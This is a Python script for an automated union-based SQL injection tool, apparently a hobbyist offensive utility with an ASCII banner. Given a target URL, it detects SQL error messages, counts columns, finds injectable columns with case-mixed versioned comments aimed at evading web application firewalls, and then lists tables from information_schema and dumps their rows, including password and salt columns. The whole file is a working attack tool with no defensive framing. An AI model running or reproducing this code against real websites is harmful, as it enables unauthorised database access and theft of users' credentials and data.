#!/usr/bin/env python3
# -*- coding: utf-8 -*-

import urllib
import argparse
import sys
import re
import logging

"""
    Process:

    1. Identify existence of Error Message
    2. Identify column count (order by 1,2,3,4,---)
    3. Identify vulnerable column with keyword (union all select "I <3 MSF")
    4. Get the vulnerable column and display db, user
    5. Display Tables from the database
    6. Show option to select the table to query or table to Dump


    ---
    Add WAF Detection and Bypass
"""
"""
TO DO LIST
----------
0x1: Implement a check for WAF
0x2: Implement a check for ending url "--" or "--+-" or "--+--" or even "#"
0x3: Format the table data nicely to print
0x4: Maybe implement a session file for each site like sqlmap, to record 
     vulnerable columns, databases, and tables, to enable --dump function.
"""

sql_Error = [
            "You have an error in your SQL syntax",
            "error in your SQL syntax",
            "mysql_numrows()",
            "Input String was not in a correct format",
            "mysql_fetch",
            "num_rows",
            "Error Executing Database Query",
            "Unclosed quotation mark",
            "Error Occured While Processing Request",
            "Server Error",
            "Microsoft OLE DB Provider for ODBC Drivers Error",
            "Invalid Querystring",
            "VBScript Runtime"
            "Syntax Error",
            "GetArray()",
            "FetchRows()",
            "Not found"
            ]

# Set the following to True if you want to stop finding vuln column
# Once one had been found, which is enough for injection purpose
find_more_than_one_vuln_column = False

session_log = "sql-injector.log"
RED     = '\033[91m'
BOLD    = '\033[1m'
GREEN   = '\033[92m'
YELLOW  = '\033[93m'
END     = '\033[0m'

banner = RED + BOLD + """
 _____ _____ __       _____     _         
|   __|     |  |     |  |  |___|_|___ ___ 
|__   |  |  |  |__   |  |  |   | | . |   |
|_____|__  _|_____|  |_____|_|_|_|___|_|_|
         |__|                             
""" + END + YELLOW + """
------------------------
| Union Based Injector |
------------------------    
""" + END + GREEN + """    
                                | zerouplink |
                                |┌∩┐(◣_◢)┌∩┐ |
                                | Hell yeah  |

""" + END

class website:

    def __init__(self):
        print(banner)
        self._initVar()
        self._parseArg()

    def _parseArg(self):
        """
        A function to parse the command argument
        And control the main program
        """
        parser = argparse.ArgumentParser(prog="Union Based SQL Injector",description="Union Based SQL injector")
        parser.add_argument("-t","--target", help="Target URL")
        parser.add_argument("-v","--verbose",help="Enable Verbose mode",action="store_true")
        # parser.add_argument("-i","--ignore",help="Ignore Saved Session",action="store_true")
        # parser.add_argument("-d","--dump", help="Dump the following table")
        args = parser.parse_args()

        if args.target == None:
            parser.print_help()
            sys.exit(1)

        elif args.target != None:
            if args.verbose:
                logging.basicConfig(format="%(levelname)s: %(message)s", level=logging.DEBUG)
                logging.info("Verbose mode Activated")
            else:
                logging.basicConfig(format="%(levelname)s: %(message)s")
            try:
                self.url = URL(args.target).fullurl
                self.log = Log()
                self.fingered = self.log.check_log(self.url)

                if self.fingered:
                    print(YELLOW + "[+] URL Detected in the Session Log file" + END)
                    print(YELLOW + "[+] Skipping Discovery Process, jumping to exploitation" + END)
                    self.unionUrl = self.log.history
                    self.displayInfo()
                else:
                    self.testError()
                    self.columnCounterGroupBy()
                    self.FindVulnColumnAuto()
                    self.displayInfo()
            except KeyboardInterrupt:
                print("\n[~] Exiting...")
            except Exception as e:
                logging.warning(e)
                print("\n[!] Error Occured")
                print(e)
                sys.exit(1)

        # elif args.dump != "":
        #     self.


    def _initVar(self):
        """
        A function kept separately to init variables
        """
        self.url           = ""
        self.vulnerable    = False
        self.errorMessage  = ""
        self.columnCount   = 0  # The total number of columns
        self.vulnColumn    = [] # Vulnerable column could be more than one column
        self.databases     = "" # The database name, should implement it to react differently
                                # if there is two or more database.
        self.tables        = [] # A list to keep track of discovered tables
        self.unionUrl      = "" # String to hold the Union url, which is universal
        self.columnRange   = [] # The range of columns including '!' for vulnerable column

        self.waf           = False

    def testError(self):
        print(YELLOW+"[+] Testing webpage for sql errors"+END)
        content = self.getpage(self.url)
        self.vulnerable = False
        self.errorMessage = ""

        # Look for error message
        for errmsg in sql_Error:
            if errmsg in content:
                self.vulnerable = True
                self.errorMessage = errmsg
                logging.info("[%s] captured " % errmsg)
                break

        if not self.vulnerable:
            print(RED+"[!] URL Doesn't seem to be vulnerable to SQLi")
            print("[!] Try other URL"+END)
            sys.exit(1)
        else:
            print(GREEN+"[+] SQL Error Message Found"+END)
            print(RED+"[+] [* %s *]" % self.errorMessage)
            print(END)

    def columnCounterOrderBy(self):
        print("[+] Counting Columns")
        baseUrl = self.url.strip("'") + "+ORDER+BY+"

        msg = "Error: Unknown column"

        for colno in range(1,101):
            injUrl = baseUrl + str(colno) + "--"

            logging.info(injUrl)
            page = self.getpage(injUrl)
            
            sys.stdout.write(str(" "+str(colno)))
            sys.stdout.flush()

            if msg in page:
                print(GREEN+"\n[+] Column Count = %d" % colno)
                print(END)
                self.columnCount = colno
                break
        if self.columnCount == 0:
            print(RED+"[!] Cannot find the column count!")
            print("[!] Target might be blocking Query with WAF"+END)
            sys.exit(1)
            
    def columnCounterGroupBy(self):
        """
            2 Approaches

            1. Find column the normal way, order by 1000....
               Harder to detect a pattern between page saying "Unknown Column" or 
               Simply a page with content different or 404

            2. Find column with union select, therefore know the vulnerable column
               As well as the column count, but the column count may not be correct
               as it will stop as soon as the string injected is found inside the 
               html response

            Decided to try 2nd approach first, since the downfall is negligible

            3. Group By Method.

            Try Group By first, if it didn't work, do the normal way
        """
        print("[+] Counting Columns with 'Group-By' Technique")
        baseUrl = self.url.replace("=","=-").strip("'")
        baseUrl += "+GROUP+BY+" + ",".join([str(i) for i in range(1,101)])+"--"
        logging.info(baseUrl)
        pattern = re.compile(r"Unknown column '(\d+)' in 'group statement'")
        page = self.getpage(baseUrl)
        if len(pattern.findall(page)) != 0:
            logging.info(pattern.findall(page))
            column = int(pattern.findall(page)[0]) - 1
            print(GREEN+"[+] Column count : %d" % column)
            print(END)
            self.columnCount = column
        else:
            column = 0
            print(RED+"[~] Could not find column with Group By")
            print("[~] Trying manual method with Order By"+END)
            self.columnCounterOrderBy() 

    def FindVulnColumnManual(self):
        # Change this if needed to detect the WAF Firewall
        waf_string = "406 Not Acceptable"

        print("[+] Fuzzing each columns manually")
        inj_plain_msg = "I <3 MSF"
        inj_hex_msg   = "0x" + inj_plain_msg.encode('hex')

        baseUrl = self.url.replace("=","=-").strip("'") + "+UNION+ALL+SELECT+"
        self.columnRange = ",".join([str(i) for i in range(1,self.columnCount+1)])

        for colno in range(1,self.columnCount+1):    
            injUrl = baseUrl + self.columnRange.replace(str(colno),inj_hex_msg) + "--"
            page = self.getpage(injUrl)

            if waf_string in page:
                logging.warning("!WAF Detected!")
                print(RED+"[!] Received HTTP Status code 406: Not Acceptable")
                print("[!] WAF Firewall Detected")
                print("[!] WAF bypass feature will be added in the next release"+END)
                sys.exit(1)
            else:
                if inj_plain_msg in page:
                    sys.stdout.write(str(" [" + str(colno) + "]"))
                    self.vulnColumn.append(colno)
                    if not find_more_than_one_vuln_column: break
                else:
                    sys.stdout.write(str(" " + str(colno)))
                    sys.stdout.flush()

        if len(self.vulnColumn) == 0:
            print(RED+"\n[-] Vulnerable column couldn't be found")
            print("[-] Please try manually"+END)
            sys.exit(1)
        else:
            print(GREEN+"\n[+] Vulnerable Column Number(s) : %s" % self.vulnColumn)
            print(END)

    def FindVulnColumnAuto(self):
        """Union all select 11111,22222,33333,44444,55555--"""
        print("[+] Fuzzing Columns Automatically to get Injectable Column")

        waf_string = "406 Not Acceptable"
        baseUrl = self.url.replace("=","=-").strip("'") + "+/*!50000UnIoN*/+/*!50000AlL*/+/*!50000SeLeCt*/+"
        columnRange = [int(str(i)*5) for i in range(1,self.columnCount+1)]
        injUrl = baseUrl + ",".join([str(i) for i in columnRange])+"--"      
        page = self.getpage(injUrl)

        logging.info(injUrl)
        
        self.vulnColumn = []
        for col in columnRange:
            if str(col) in page:
                self.vulnColumn.append(columnRange.index(col)+1)
        logging.info("self.vulnColumn = %s" % self.vulnColumn)

        if len(self.vulnColumn) == 0:
            print("\n[-] Vulnerable column couldn't be found")
            print("[-] Trying column by column")
            self.FindVulnColumnManual()
        else:
            print("\n[+] Vulnerable Column Number(s) : %s" % self.vulnColumn)

    def displayInfo(self):
        """ 
        Display Database name
        User, hosts, version... etc
        """
        if self.unionUrl == "":
        # Need to check if it is empty, since there could be union url in the log
            colnumbers = []
            for i in range(1,self.columnCount+1):
                if i == self.vulnColumn[0]:
                    # colnumbers.append("!")
                    colnumbers.append("$")
                    # Mark injection point with '!'
                    # Remark : ! will mess up with the WAF bypass /*! */
                else: colnumbers.append(i)

            self.unionUrl = self.url.replace("=","=-").strip("'") + "+/*!50000UnIoN*/+/*!50000AlL*/+/*!50000SeLeCt*/+"
            self.unionUrl += ",".join([str(i) for i in colnumbers])

            self.log.write_log(self.unionUrl)

        else:
            pass

        # Replace injection point '!' with query
        databaseUrl = self.unionUrl.replace('$',"group_concat(0x2e3a,database(),0x3a2e)")+"--"
        versionUrl = self.unionUrl.replace('$',"group_concat(0x2e3a,@@version,0x3a2e)")+"--"
        tableUrl = self.unionUrl.replace('$',"group_concat(0x2e3a,table_name,0x3a2e)").strip("--")
        tableUrl += "+from+information_schema.tables+where+table_schema=database()--"

        logging.info(databaseUrl)
        logging.info(versionUrl)
        logging.info(tableUrl)

        try:
            self.version = self.parse(self.getpage(versionUrl))[0]
            print(GREEN+"\n[+] Version   : %s" % self.version)

            self.databases = self.parse(self.getpage(databaseUrl))[0]
            print("[+] Databases : %s" % self.databases)

            self.tables = [str(i).strip(".:.") for i in self.parse(self.getpage(tableUrl))[0].split(",")]
            self.menu()

        except IndexError:
            with open("debug.html","w") as cf:
                cf.write(self.getpage(tableUrl))
            print("[!] Check Debug.html")
            sys.exit(1)

    def parse(self,data):
        return re.findall("[.+]?\.\:(.+)\:\.[.+]?",data)

    def dumpTable(self,table):
        print("\n[+] Dumping table : %s" % table)
        columnUrl = self.unionUrl.replace('$',"group_concat(0x2e3a,column_name,0x3a2e)").strip("--") \
        +"+from+information_schema.columns+where+table_name=" + "0x" + table.encode('hex') + "--"

        logging.info(columnUrl)

        raw_data = self.parse(self.getpage(columnUrl))[0]
        columns = [str(i).strip(".:.") for i in raw_data.split(",")]

        if len(columns) > 0:
            print("[+] Columns : %s" % columns)
            self.extract_Data(columns,table)
        else:
            print("[-] No Columns Found")

    def extract_Data(self,column,table):
        try:
            concat = 'group_concat(0x2e3a,%s,0x3a2e)' % ",0x7c,".join([str(i) for i in column])
            # eg : 'group_concat(0x2e3a,id,0x7c,pass,0x7c,salt,0x3a2e'
            #                      .:   id   .  pass   .  salt   :.
            tail = "+from+%s--" % (self.databases+"."+table) 
            query = self.unionUrl.replace('$',concat) + tail

            logging.info(query)

            raw_data = self.parse(self.getpage(query))[0]
            data = [str(i).strip(".:.") for i in raw_data.split(",")]
            print(GREEN+"\n\t Table   : %s" % table)
            print(GREEN+"\t Columns : %s" % ",".join([str(i) for i in column]))
            print(YELLOW+"\t-------------------------------------"+END)
            print(GREEN+"\t"+"\n\t".join([str(i) for i in data]))
            print(YELLOW+"\t-------------------------------------"+END)

        except Exception as e:
            print("[-] Something went wrong")
            with open('debug.html','w') as cf:
                cf.write(self.getpage(query))
            print("[!] Check debug.html")
            logging.debug(e)

    def getpage(self, url):
        try:
            return urllib.urlopen(url).read()
        except IOError:
            print(RED+"[!] Network Error Occured"+END)
            sys.exit(1)
        except Exception as e:
            logging.warning(e)
            print(RED+"[!] Error Occured"+END)
            print(e)
            sys.exit(1)

    def menu(self):
        print(GREEN+"\n[+] Tables    : %s" % "\n\t\t".join([str(i) for i in self.tables]))
        tbl_choice = raw_input(GREEN+"\nEnter table name : ").lower()
        if tbl_choice == "quit" or tbl_choice == "exit" or tbl_choice == "q" or tbl_choice == "e":
            print(RED+"[~] Exiting"+END)
            sys.exit(1)
        elif tbl_choice in self.tables:
            self.dumpTable(tbl_choice)
            raw_input("Press Enter to go back")
            self.menu()
        elif tbl_choice not in self.tables:
            print("[!] Table name [%s] is not in database" % tbl_choice)
            self.menu()

class Log:
    def __init__(self):
        try: 
            open(session_log).read()
        except IOError:
            open(session_log,'w')
    def check_log(self,url):
        """
        To check if the given URL exists
        in the log file. 
        Returns True or False
        """
        data = self.read_log()
        self.data_Exist = False
        self.history = ""

        url = url[:url.index("=")]

        for item in data:
            if url in item:
                self.data_Exist = True
                self.history = item
                logging.info("Session Data found in log file \n%s" % self.history)

        return self.data_Exist

    def read_log(self):
        return [line.strip('\n') for line in open(session_log).readlines()]

    def write_log(self,url):
        with open(session_log,'a') as session:
            session.write(url)
        logging.info("Log Written : [%s]" % session_log)


class URL:
    def __init__(self,url):
        self.fullurl = url.strip("-")
        if not "http" in self.fullurl:
            self.fullurl = "http://" + self.fullurl
        if not "'" in self.fullurl:
            self.fullurl = self.fullurl + "'"
        if not "=" in self.fullurl:
            print("[!] No injection point defined")
            print("[!] URL need to have = in them")
            sys.exit(1)

if __name__ == "__main__":
    app = website()
